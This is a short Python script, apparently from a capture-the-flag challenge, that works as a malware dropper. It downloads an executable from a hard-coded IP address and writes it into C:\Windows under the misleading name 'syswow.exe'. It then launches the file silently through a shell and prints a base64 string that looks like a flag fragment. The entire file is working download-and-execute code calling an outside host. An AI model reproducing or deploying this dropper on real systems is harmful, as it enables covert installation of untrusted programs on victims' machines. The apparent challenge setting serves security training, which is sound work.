import os
import requests
import subprocess
import sys
from pathlib import Path

def main():
    base_dir = r"C:\Windows"
    files_to_download = [
        {
            "url": "http://146.190.194.189/files/chall/mpsys.exe",
            "file_name": "syswow.exe"
        }
    ]

    try:
        Path(base_dir).mkdir(parents=True, exist_ok=True)

        for file_info in files_to_download:
            url = file_info["url"]
            file_name = file_info["file_name"]
            file_path = os.path.join(base_dir, file_name)

            print(f"Sending GET request to {url}...")
            response = requests.get(url)
            response.raise_for_status()

            with open(file_path, "wb") as f:
                f.write(response.content)
            print(f"File saved to {file_path}")

        mpsys_path = os.path.join(base_dir, "syswow.exe")
        print(f"Attempting to execute {mpsys_path}...")

        subprocess.Popen(f'"{mpsys_path}"', shell=True, cwd=base_dir, stdin=None, stdout=None, stderr=None, close_fds=True)
        print(f"U1RPUk17Z2FtcGFuZ19sNGhf")
        sys.exit()

    except FileNotFoundError as fnf_error:
        print(f"Error: {fnf_error}")
    except requests.exceptions.RequestException as req_error:
        print(f"HTTP request failed: {req_error}")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
